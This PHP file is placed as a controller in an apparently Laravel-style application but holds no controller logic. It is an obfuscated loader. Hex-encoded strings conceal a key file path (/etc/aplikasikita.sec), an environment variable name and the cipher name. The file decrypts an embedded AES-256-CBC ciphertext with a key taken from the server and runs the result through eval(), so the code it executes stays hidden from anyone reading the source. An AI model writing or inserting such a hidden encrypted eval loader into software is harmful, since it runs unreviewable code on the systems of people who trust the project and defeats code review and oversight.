<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('sEbrTtVHS120tn3S8lEnFA==');

$c=base64_decode(

'D1M/fV8MS0AAd51pvKagL6di8yqudaLVDKHCnN1wSDnCLTU9eUgEXm06fIxBWozvy3Kw3lcKNlKE' .
'S8qOvCbY4JXZ9cY+k1YPcXWrxulXVceBYGihrQGkx6qu9uov1P+fq+VGnoIeSBRTnvfGHqJLstCG' .
'dP9oDR/Nc3F4DgaKnK8ge5qgwXY5SNKCztObY+TCpeg2qyNMdR0XqsqQd0UaUuxBMzZ5sgwH83PZ' .
'jCQDj6uzxpVfmBPgsAYDvwTnZz2/'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

